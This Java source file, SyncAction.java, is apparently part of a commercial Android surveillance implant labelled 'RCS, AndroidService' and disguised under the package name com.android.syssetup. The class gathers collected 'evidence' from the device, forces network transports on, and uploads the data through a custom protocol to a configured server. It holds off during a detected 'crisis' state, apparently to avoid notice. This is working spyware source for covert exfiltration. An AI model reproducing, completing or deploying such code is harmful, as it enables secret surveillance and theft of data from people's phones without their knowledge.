/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SyncAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.action;

import com.android.mm.M;
import com.android.syssetup.Beep;
import com.android.syssetup.Status;
import com.android.syssetup.Trigger;
import com.android.syssetup.action.sync.Transport;
import com.android.syssetup.action.sync.ZProtocol;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfAction;
import com.android.syssetup.crypto.Keys;
import com.android.syssetup.evidence.EvidenceCollector;
import com.android.syssetup.interfaces.iProtocol;
import com.android.syssetup.manager.ManagerModule;
import com.android.syssetup.util.Check;

import java.util.Date;
import java.util.Vector;

// TODO: Auto-generated Javadoc

/**
 * The Class SyncAction.
 */
public abstract class SyncAction extends SubActionSlow {

	private static final String TAG = "SyncAction"; //$NON-NLS-1$

	/**
	 * The log collector.
	 */
	protected EvidenceCollector logCollector;

	/**
	 * The agent manager.
	 */
	protected ManagerModule moduleManager;
	// protected Transport[] transports = new Transport[Transport.NUM];
	/**
	 * The transports.
	 */
	protected Vector<Object> transports;

	/**
	 * The protocol.
	 */
	protected iProtocol protocol;

	/**
	 * The initialized.
	 */
	protected boolean initialized;

	/**
	 * Instantiates a new sync action.
	 *
	 * @param type       the action id
	 * @param jsubaction the conf params
	 */
	public SyncAction(final ConfAction jsubaction) {
		super(jsubaction);

		logCollector = EvidenceCollector.self();
		moduleManager = ManagerModule.self();
		transports = new Vector<Object>();

		protocol = new ZProtocol();
		initialized = parse(jsubaction);
		initialized &= initTransport();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		if (Cfg.DEBUG) {
			Check.requires(protocol != null, "execute: null protocol"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.requires(transports != null, "execute: null transports"); //$NON-NLS-1$
		}

		if (status.synced == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "Already synced in this action: skipping"); //$NON-NLS-1$ //$NON-NLS-2$
			}

			return false;
		}

		if (status.crisisSync()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Warn: " + "SyncAction - no sync, we are in crisis"); //$NON-NLS-1$ //$NON-NLS-2$
			}

			return false;
		}

		// moduleManager.reload(AgentType.AGENT_DEVICE);
		moduleManager.resetIncrementalLogs();

		boolean ret = false;

		if (Cfg.DEMO) {
			Beep.beep();
			Status.self().makeToast(M.e("AGENT synchronization in progress"));
		}

		for (int i = 0; i < transports.size(); i++) {
			final Transport transport = (Transport) transports.elementAt(i);

			if (Cfg.DEBUG) {
				Check.log(TAG + " execute transport: " + transport); //$NON-NLS-1$
			}

			if (Cfg.DEBUG) {
				String instance = new String(Keys.self().getBuildId());
				Check.log(TAG + " transport Sync url: " + transport.getUrl() + " instance: " + instance.substring(4)); //$NON-NLS-1$
			}

			if (transport.isAvailable() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (execute): transport unavailable, enabling it..."); //$NON-NLS-1$
				}

				// enable() should manage internally the "forced" state
				transport.enable();
				// TODO: wait for the enabling.
			}

			// Now the transport should be available
			if (transport.isAvailable() == true) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " execute: transport available"); //$NON-NLS-1$
				}

				protocol.init(transport);

				try {
					Date before, after;

					if (Cfg.DEBUG) {
						before = new Date();
					}

					Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
					ret = protocol.perform();
					Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
					// transport.close();

					if (Cfg.DEBUG) {
						after = new Date();
						final long elapsed = after.getTime() - before.getTime();
						Check.log(TAG + " (execute): elapsed=" + elapsed / 1000); //$NON-NLS-1$ //$NON-NLS-2$
					}
				} catch (final Exception e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " Error: " + e.toString()); //$NON-NLS-1$
					}

					ret = false;
				}

				// wantUninstall = protocol.uninstall;
				// wantReload = protocol.reload;

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " execute: transport not available"); //$NON-NLS-1$
				}
			}

			if (ret) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: SyncAction OK"); //$NON-NLS-1$
				}

				status.synced = true;
				return true;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: SyncAction Unable to perform"); //$NON-NLS-1$
			}
		}

		return false;
	}

	/**
	 * Inits the transport.
	 *
	 * @return true, if successful
	 */
	protected abstract boolean initTransport();
}